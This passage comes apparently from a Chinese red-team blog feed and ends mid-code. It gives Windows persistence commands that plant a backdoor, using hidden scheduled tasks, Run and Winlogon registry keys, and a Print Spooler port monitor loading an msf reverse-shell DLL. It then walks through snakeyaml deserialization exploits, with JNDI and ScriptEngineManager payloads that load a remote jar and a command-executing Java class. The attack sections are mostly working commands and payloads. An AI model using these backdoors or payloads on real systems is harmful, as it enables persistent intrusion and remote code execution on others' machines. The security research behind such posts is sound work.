eqfPFqbfVm1JSMebNr3gHyV+8fbM0sM6aw+dvEoOumlTXz2yA1kLXKSrYzaxubH6H2AxOpfXt/at82gM4yLf29120D6fTW/oJ+dIoRonZ0c0NKWUvzCGQKWUsUP5esudvleLM8mdmdkISIeMISnEkL1vNEJHRMVr9d7bgSnHnSmNtl+mMfPydqP8G6nTvm7Ptvy5sX85gqQdb4vFz+uNlD0cfHL6eqyx8P9NuMXB+63jFE3/xFy6HVDXRJ1SXUsDpzngEAAJQHkDUlay6pMrHrdATdFmQN0TFlLY24rVvwMJ35cKwQsQbJSSFjLGUsaWe29BfL9XTinQZFPR0VrwWVNT3o50GrNfD34pC1OMGzZoTkvqyKwf17kZKhy1T7oUG1QjfnaseVQNtR8fcZPq+R+zH72sljDpSnaktdN+vcVpas8b13OVmuRi0tLd75ckgvR8qaf15a6PHLjXu15XG63NguWLd0cujQamq4pIouaVgdONcAAABKH8iafAwyeFLSYktYWiBriI4taEnC9nZTTzq9byQd29iXjm+sp2MbvNcTm4ScbRJytkGwvq+gj3jfh9pEveTPrEXPbAWTRtZUTEEIrCuerCWNoZ39cKSQstbRYw6Up2qrC8gan1/Rv7QzZXoGriJm1vjcTq0Rx1dDU41zDQAAoPSBrHVS1lzlSXRU1rgMslZZyXZmbdWcHnRq7zA6sq5OcnhtHbUJMWsTgsavh9cyXrlE1EmWNTW4j5hZyMQ9oI+VHCkgpig4ZC1CAjmmLHDkvlLsPyhU6WQ0th9GkmXNO0+8P1fdqHMd3H/njjn7tipd1qwZsc7GmlEr9Xjndiq+aAQAAMoQyFonZM1Ez7LFoetC1hAdLWhpRI2zclZ3Orm7kVrX9PYx5UyXHVrzqKI3zR15s9o6LmqwHpoJ4nJrZsscpCoZ88WgpZFqzQasmbEocfCkwBpMh0RP7T9rWYton2ecjIIo8bHjEjAzwXbCEuSdw2CZKAwdX2eO2S5PbqvCZc06v9GPK3pS56/T93eWeLNyqq2Yz8MVKvrcyi8aqZkaON8AAABKG8hajmQtG3RnbRlLArJWeWFJSytqnOYJtSEWjruNmkbX0MwRN9O0YdfTpMHX0bh+19CouqvpyV5X0tAeV6itk6MH9Rlc8masF4NaWwx8GXFuL2IMgAPSFhoYh7eVbVuDbJewuIQq1DdrvasdV8LnSKHPhX3c6jFEfdx6P/7X7Susbsl09Jgjz0lkW5Usa0qaRJ/97kXOjHn/McF1LQJJNbNWerKGLxoBAIDyA7Lm+IKRfGF31iVkUejZNshaZSUbUUMqI2mlsNRSrrImZ9Eur6XawGOQEY9F8n8wcMhV6s+tlYCYuZI5v/iiEQAAKDfKRdbMurmm6vDhw1QI9A4hawjSdQNZ81IoWWuq5W+ADMuZ61FIvjb2V/tzuK6rPJAI0SuFmOd3dcMl+JtrAABQRmBmjajqSNtRKgR2Z11SFgdkDUHKP5A1L4WSNS+OmbTQo4z8CGT4q/05lTOzxuCLRgAAoJyArLGsHTtBhcDurEvI4oCsIUj5B7LmpeiyZn8+LWZmrJJm1hh80QgAAJQPkDUha+3tRIXA7qxLyOKArCEIUqxUnqx54qwljN/b63U6NrPm7bMUBM48vxJ80QgAAJQNkDUpa+1CpvKP3dkoIYuC10PWEAQpRipR1vwkfLtjx2bWSljWAAAAlA2QNSFr6jXvsTtrixrjkjQNr4esIQhSjFSGrCmBcs2K2ahvkHSuS6LEHoc0zy8AAIDyArKGmTUEQZDElLesde2Y5xcAAEB5AVkTsnbmzBkqBHZnbVFjXJJmAllDEKQYgawhCIIgSOFTTrL2tZ81Z8VXfvWW2jIuRP9/kddJ4pkt6vUAAAAASUVORK5CYII=" alt="img"></p><p>注：点击“任务计划程序库”</p><p>为了隐蔽性。我们可以按照其规范创建，如创建一个AppTask：</p><p>schtasks &#x2F;Create &#x2F;TN \Microsoft\Windows\AppTask\AppRun &#x2F;SC daily &#x2F;ST 08:00 &#x2F;MO 1 &#x2F;TR C:\Windows\System32\shell.exe &#x2F;RU System &#x2F;F</p><p><img src="/../persistence1/Image(77).png" alt="img"></p><p>如图，这样就不能直接看到了。</p><h1 id="4：启动项-注册表键建立后门"><a href="#4：启动项-注册表键建立后门" class="headerlink" title="4：启动项&#x2F;注册表键建立后门"></a>4：启动项&#x2F;注册表键建立后门</h1><h3 id="1：系统启动文件夹："><a href="#1：系统启动文件夹：" class="headerlink" title="1：系统启动文件夹："></a>1：系统启动文件夹：</h3><p>将程序放置到启动文件夹中会导致该程序在用户登录时执行。</p><p>Windows系统有两种常见的启动文件夹。</p><p># 位于以下目录中的程序将在指定用户登录时启动</p><p>C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start</p><p>C:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><p># 位于以下目录中的程序将在所有用户登录时启动</p><p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</p><h3 id="2：运行键-Run-Keys"><a href="#2：运行键-Run-Keys" class="headerlink" title="2：运行键(Run Keys):"></a>2：运行键(Run Keys):</h3><p>windows有很多注册表项可以用来设置在系统启动或用户登录时运行指定的程序或加载指定dll文件。</p><p>用户登录时，系统会依次检查注册表运行键中的程序。</p><p>利用条件：</p><p>看情况，如果修改HKEY_LOCAL_MACHINE需要管理员权限。</p><p># 以下注册表项中的程序将在当前用户登录时启动</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</p><p># 以下注册表中的程序将在所有用户登录时启动</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</p><p>添加一个Backdoor的键，键值指向后门程序的绝对路径</p><p>reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” &#x2F;v Backdoor &#x2F;t REG_SZ &#x2F;d “C:\Windows\System32\shell.exe”</p><p><img src="/../persistence1/Image(78).png" alt="img"></p><p>成功上线！</p><h3 id="3：Winlogon-Helper"><a href="#3：Winlogon-Helper" class="headerlink" title="3：Winlogon Helper:"></a>3：Winlogon Helper:</h3><p>Winlogon 是 Windows 系统的组件，用于处理与用户有关的各种行为，如登录、注销、在登录时加载用户配置文件、锁定屏幕等。这些行为由系统注册表管理，注册表中的一些键值定义了在 Windows 登录期间会启动哪些进程。</p><p>hacker 可以滥用此类注册表键值，使 Winlogon 在用户登录时执行恶意程序，以此建立持久化后门。</p><p>常见的有以下两个：</p><p># 指定用户登录时执行的用户初始化程序，默认为 userinit.exe</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</p><p># 指定 Windows 身份验证期间执行的程序，默认为 explorer.exe</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\shell</p><p>如，利用第一个：</p><p>reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v Userinit &#x2F;d “C:\Windows\system32\userinit.exe,shell.exe” &#x2F;f</p><h1 id="5：Port-Minitors"><a href="#5：Port-Minitors" class="headerlink" title="5：Port Minitors"></a>5：Port Minitors</h1><p>打印后台处理服务（Print Spooler）负责管理 Windows 系统的打印作业。与该服务的交互是通过 Print Spooler API 执行的，其中包含 AddMonitor 函数，用于安装 Port Monitors（本地端口监听器），并连接配置、数据和监视器文件。AddMonitor 函数能够将 DLL 注入 spoolsv.exe 进程，以实现相应功能，并且通过创建注册表键，hacker 可以在目标系统上进行权限持久化。</p><p>利用条件：Administrator。系统重启</p><p>1：msf生成恶意dll</p><p>2：将生成的 DLL 上传到目标主机的 C:\Windows\system32 目录中，执行一下命令，通过编辑注册表安装一个端口监视器。</p><p>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors\TestMonitor” &#x2F;v “Driver” &#x2F;t REG_SZ &#x2F;d “reverse_tcp.dll”</p><p>系统重启时，Print Spooler服务在启动过程中会读取Monitors注册表项的所有子键。</p><p>并以SYSTEM权限加载Driver键值指定的DLL文件。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Red Team</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/14/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2024/01/14/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/14/NTLMRelay/"/>
    <url>/2024/01/14/NTLMRelay/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/14/ADCS%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/"/>
    <url>/2024/01/14/ADCS%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/01/12/JDBCDeserialize/"/>
    <url>/2024/01/12/JDBCDeserialize/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>snakeyaml</title>
    <link href="/2024/01/12/snakeyaml/"/>
    <url>/2024/01/12/snakeyaml/</url>
    
    <content type="html"><![CDATA[<p>CVE-2022，很新的洞了</p><p>环境 java 8u66</p><p>snakeyaml 1.27</p><p>使用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;mike&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> yaml.dump(person);<br>        System.out.println(str);<br>       <br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person2</span> <span class="hljs-operator">=</span> (Person) yaml.load(str);<br>        System.out.println(person2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>dump序列化，load反序列化。</p><p>可以加载对象，序列化触发get，反序列化触发set。</p><p>这一看不就是和fastjson差不多吗？直接打JNDI试试。</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl:"></a>JdbcRowSetImpl:</h2><p>POC:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">!!com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.rowset</span><span class="hljs-selector-class">.JdbcRowSetImpl</span> &#123;dataSourceName: ldap:<span class="hljs-comment">//127.0.0.1:1389/Exploit, autoCommit: true&#125;</span><br></code></pre></td></tr></table></figure><p>开启ldap服务器：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\java11_low_version\bin\java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer http://<span class="hljs-number">127.0.0.1:8082</span>/#Exploit <span class="hljs-number">1389</span><br></code></pre></td></tr></table></figure><p>恶意exploit：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        <span class="hljs-keyword">String</span> poc = <span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: ldap://127.0.0.1:1389/Exploit, autoCommit: true&#125;&quot;</span>;<br>        Yaml yaml = <span class="hljs-keyword">new</span> <span class="hljs-type">Yaml</span>();<br>        yaml.load(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>漏洞分析：</p><p>和fastjson很像，但是又不太一样。</p><p>审一下：</p><p><img src="/../snakeyaml/Image.png" alt="Image"></p><p><img src="/../snakeyaml/Image-1705058018771-5.png" alt="Image"></p><p>一路跟断点来到：</p><p><img src="/../snakeyaml/Image-1705058041229-7.png" alt="Image"></p><p><img src="/../snakeyaml/Image-1705058051135-9.png" alt="Image"></p><p>一共执行了3轮，第一轮解析了JdbcRowSetImpl这个类，然后解析其键值，一共两个键值，解析两次。</p><p>第2轮data为DataSourceName，来到safeConstructor：</p><p><img src="/../snakeyaml/Image-1705058071921-11.png" alt="Image"></p><p>经过两轮迭代后，key解析完毕，然后解析value：</p><p>在这个方法执行了set方法：</p><p><img src="/../snakeyaml/Image-1705058191279-13.png" alt="Image"></p><p><img src="/../snakeyaml/Image-1705058195914-15.png" alt="Image"></p><p>跟进set：</p><p><img src="/../snakeyaml/Image-1705058216568-17.png" alt="Image"></p><p>到这里就到了JdbcRowSetImpl链的setAutoCommit方法了。</p><p>小问题：</p><p>我现在都不知道java到底如何获取getter setter?</p><p>是自己写反射？还是jdk就有工具？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.javaws.jnl.PropertyDesc;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><span class="hljs-keyword">import</span> org.example.Person;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">PropertyDescriptor</span> <span class="hljs-variable">pd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyDescriptor</span>(<span class="hljs-string">&quot;username&quot;</span>, Person.class);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getter</span> <span class="hljs-operator">=</span> pd.getReadMethod();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setter</span> <span class="hljs-operator">=</span> pd.getWriteMethod();<br><br>        System.out.println(<span class="hljs-string">&quot;Getter Method: &quot;</span> + getter.getName());<br>        System.out.println(<span class="hljs-string">&quot;Setter Method: &quot;</span> + setter.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用的是PropertyDescriptor，是java.Bean下的一个类。</p><p>getReadMethod获取的是getter，getWriteMethod获取的是setter。</p><p>比如我要写值：</p><p><img src="/../snakeyaml/Image(8).png" alt="img"></p><p>getWriteMethod().invoke(object, data);</p><h2 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h2><p>ScriptEngineManager:</p><p>先来学下什么是SPI：</p><p>实际例子：mysql-connector,众所周知mysql有很多版本如mariadb，mysql，要加载这些，怎么优雅简洁的加载呢？</p><p>就要用到SPI了。</p><p>例：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">HelloSPI</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后有两个实现类：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageHello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HelloSPI</span></span>&#123;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;This is image hello&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TextHello</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">HelloSPI</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sayHello</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Text Hello&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后需要配置文件，在resources&#x2F;META-INF&#x2F;services&#x2F;</p><p>添加org.example.HelloSPI</p><p>文件内容：</p><p>org.example.ImageHello</p><p>org.example.TextHello</p><p>其实就是那两个实现类。</p><p>SPIDemo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.util.ServiceLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SPIDemo</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>ServiceLoader&lt;HelloSPI&gt; serviceLoader = ServiceLoader.load(HelloSPI.class);<br><span class="hljs-keyword">for</span>(HelloSPI helloSPI : serviceLoader) &#123;<br>helloSPI.sayHello();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过serviceLoader就可以加载所有的服务了。比如使用mysql-connector，就可以有所有版本的连接了。</p><p>ServiceLoader实现了Iterator接口，具体请直接去看类的代码，其作用如下：</p><p><strong>首先，</strong>ServiceLoader实现了Iterable接口，所以它有迭代器的属性，这里主要都是实现了迭代器的hasNext和next方法。这里主要都是调用的lookupIterator的相应hasNext和next方法，lookupIterator是懒加载迭代器。</p><p><strong>其次，</strong>LazyIterator中的hasNext方法，静态变量PREFIX就是”META-INF&#x2F;services&#x2F;”目录，这也就是为什么需要在classpath下的META-INF&#x2F;services&#x2F;目录里创建一个以服务接口命名的文件。</p><p><strong>最后，</strong>通过反射方法Class.forName()加载类对象，并用newInstance方法将类实例化，并把实例化后的类缓存到providers对象中，(LinkedHashMap&lt;String,S&gt;类型） 然后返回实例对象。</p><p>所以缺点也是显而易见的，实例化对象占资源较大。</p><p>验证：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String poc <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://acld0j.dnslog.cn\&quot;]]]]\n&quot;</span><span class="hljs-comment">;</span><br>Yaml yaml <span class="hljs-operator">=</span> new Yaml()<span class="hljs-comment">;</span><br>yaml.load(poc)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/../snakeyaml/Image-1705061069684-20.png" alt="Image"></p><p>回到snakeyaml。</p><p>利用项目：</p><p><a href="https://github.com/artsploit/yaml-payload.git">https://github.com/artsploit/yaml-payload.git</a></p><p>编译：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">!!javax.script.ScriptEngineManager [<br>!!java.net.URLClassLoader [[<br>!!java.net.URL [<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>]<br>]]]<br></code></pre></td></tr></table></figure><p>看下其项目文件：</p><p><img src="/../snakeyaml/Image-1705061141187-22.png" alt="Image"></p><p>如图，其构造函数是命令执行的地方，这玩意实现了ScriptEngineManager类。</p><p>SPI配置文件：</p><p><img src="/../snakeyaml/Image-1705061188317-24.png" alt="Image"></p><p>然后跟下断点：<br><img src="/../snakeyaml/40399E57B3C64ACBB09E1CFC5364320C.png" alt="img"><br>前面都差不多，但是这里用的是ContructorSequence，而不是之前的SafeConstructor。<br><img src="/../snakeyaml/2393BC783F3A4AE9A2F6323606001A06.png" alt="img"><br>直接锁定这个方法。</p><p>经过来回断点，把功能搞明白了。<br><img src="/../snakeyaml/04138C9119A64A0C8580B14DF65695F9.png" alt="img"><br>从内往外实例化对象，现实java.net.URL， 然后是其ClassLoader，然后是ScriptEngineManger。</p><p>来到第三次：<br><img src="/../snakeyaml/568CD1CBEA3F46219A68780E501B4288.png" alt="img"><br>我们直接在ScriptEngineManager的构造函数打个断点。<br><img src="/../snakeyaml/C73018C357AF46D894B8962BE1005C8D.png" alt="img"></p><p><img src="/../snakeyaml/0D99A42B34AA49AFB0CEE0CB68BB8B05.png" alt="img"><br>最后在这个方法执行了代码。</p><p>我们不妨先猜一下，SPI里，Loader储存的都是实例化对象，<br><img src="/../snakeyaml/3DDE68AA89794758823DA98C6C51B925.png" alt="img"></p><p>在第二次迭代来到：<br><img src="/../snakeyaml/C62910672ECE49B49DCBC2D09D4D1E16.png" alt="img"></p><p>到这里，loader用的是我们传入的URLClassLoader。泛型是ScriptEngineFactory<br>利用URLClassLoader寻找到jar包，然后实例化了<br><img src="/../snakeyaml/27F234DE06BA422B93AA1CA6636171F3.png" alt="img"><br>导致命令执行！</p><p>一些疑问：</p><p>1：关于URLClassloader如何远程加载jar文件并执行命令？</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">Questions</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception&#123;<br>        URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>)&#125;;<br>        URLClassLoader loader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(urls);<br><br>        loader.loadClass(<span class="hljs-string">&quot;artsploit.AwesomeScriptEngineFactory&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>rt，远程加载jar包。</p><p>然后再套一层。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">URL[] urls <span class="hljs-operator">=</span> &#123;new URL(<span class="hljs-string">&quot;http://127.0.0.1:8082/yaml-payload.jar&quot;</span>)&#125;<span class="hljs-comment">;</span><br>URLClassLoader loader <span class="hljs-operator">=</span> new URLClassLoader(urls)<span class="hljs-comment">;</span><br><br>ScriptEngineManager scriptEngineManager <span class="hljs-operator">=</span> new ScriptEngineManager(loader)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>2：为什么选择了SequenceConstructor而不是第一个链的SafeConstructor？</p><p>我探寻了一下，类里面套一层类，就被解析为SequenceNode。</p><p>然后是Constructor，像jdbcRowSetImpl利用链就被解析为MappingNode</p><h2 id="不出网的利用"><a href="#不出网的利用" class="headerlink" title="不出网的利用"></a>不出网的利用</h2><p>参考：<a href="https://xz.aliyun.com/t/10655">https://xz.aliyun.com/t/10655</a></p><p>之前看过长亭的fastjson的commons-io写webshell，相当的精彩。</p><p><img src="/../snakeyaml/image-20240112195143936.png" alt="image-20240112195143936"></p><p>如图，fastjson是会检查构造函数的，所以fastjson那个链找了6个类，还有循环引用才成功。</p><p>目前公开的jre 8 下写文件poc：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span 